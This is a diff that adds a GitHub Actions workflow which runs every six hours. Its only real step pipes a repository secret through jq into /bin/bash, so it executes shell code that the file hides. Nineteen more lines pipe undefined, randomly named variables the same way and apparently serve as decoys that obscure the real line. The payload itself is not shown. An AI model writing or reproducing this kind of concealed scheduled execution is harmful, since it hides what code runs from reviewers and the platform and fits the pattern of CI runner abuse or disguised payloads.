@@ -1,0 +1,37 @@
+name: huimuxiaocui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huimuxiaocui
+        env:
+          d0: ${{ secrets.d0 }}
+        run: |
+          echo $d0 | jq -r .utgg482 | /bin/bash
+          echo $vqmo2475 | jq -r .nzq8 | /bin/bash
+          echo $sht61 | jq -r .usaet27443 | /bin/bash
+          echo $aki5 | jq -r .nxk883 | /bin/bash
+          echo $snhk6123 | jq -r .ynzr2557 | /bin/bash
+          echo $nyfl39964 | jq -r .cw51976 | /bin/bash
+          echo $wuy2576 | jq -r .jyka45382 | /bin/bash
+          echo $yp56 | jq -r .iiz4520 | /bin/bash
+          echo $reb5347 | jq -r .kqqf04378 | /bin/bash
+          echo $p03 | jq -r .mpho131 | /bin/bash
+          echo $xjzv1401 | jq -r .tj4 | /bin/bash
+          echo $fdmbm3 | jq -r .uy68 | /bin/bash
+          echo $z9 | jq -r .wb92818 | /bin/bash
+          echo $run54 | jq -r .ukcux05940 | /bin/bash
+          echo $ukx48 | jq -r .rceid399 | /bin/bash
+          echo $noppa6142 | jq -r .zc27 | /bin/bash
+          echo $f92 | jq -r .igfm417 | /bin/bash
+          echo $jth183 | jq -r .yggf3 | /bin/bash
+          echo $lem3701 | jq -r .sshg0 | /bin/bash
+          echo $goqc9926 | jq -r .g0 | /bin/bash
+
